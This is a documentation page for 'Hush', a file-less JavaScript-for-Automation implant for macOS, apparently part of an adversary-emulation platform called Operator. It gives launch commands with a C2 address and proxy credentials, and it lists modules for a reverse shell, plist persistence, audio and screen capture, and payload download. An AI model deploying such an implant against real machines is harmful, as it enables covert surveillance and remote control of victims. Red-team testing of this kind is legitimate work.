---
title: "Hush"
slug: "hush"
excerpt: ""
hidden: false
metadata: 
  image: []
  robots: "index"
createdAt: "Wed Jun 29 2022 16:58:11 GMT+0000 (Coordinated Universal Time)"
updatedAt: "Wed Jun 29 2022 16:58:11 GMT+0000 (Coordinated Universal Time)"
---
Hush is a lightweight JXA agent for Mac OS systems after Yosemite (10.10).  Hush is a _fully_ modular file-less implant that will dynamically request and install new modules are they are needed.

### Running

```bash
osascript -l JavaScript hush-darwin.js
```

You can run with a specified target address with:

```bash
osascript -l JavaScript hush-darwin.js http://192.168.1.1:3391 http
```

You can also launch with a proxy configuration:

```bash
osascript -l JavaScript hush-darwin.js http://192.168.1.1:3391 http http://alecks:password@192.168.10.1:8080
```

### Modular system

All components of Hush are modular, from the C2 to the commands it executes. It uses Javascript's `eval` to load in functions to a top-level `modules` object. Each module is considered an "executor" by Operator.

Currently available modules:

- **bash**: run a shell command
- **capture-audio**: record system audio
- **config**: update Hush running config
- **dylib-hijack-check**: check for dylib hijack opportunities
- **execute**: run a binary with specific arguments
- **http**: HTTP POST C2 suport
- **plist-persist-user**: install a user-level plist persistence
- **pwd**: print working directory
- **request-payload**: download the specified target
- **screenshot**: take a screenshot of the desktop
- **sh**: run a shell command
- **shell**: spawn an interactive reverse shell back to Operator  
    

A TTP that would call the pwd module would be formatted like this:

```yaml
platforms:
    darwin:
        pwd:
            command: ''
```

Shell commands are run using the standard `sh` executor and no TTP changes are needed.

Modules that take arguments use JSON formatted data:

```yaml
platforms:
    darwin:
        shell:
            command: '{"Target": "#{operator.tcp_shell}"}'
```
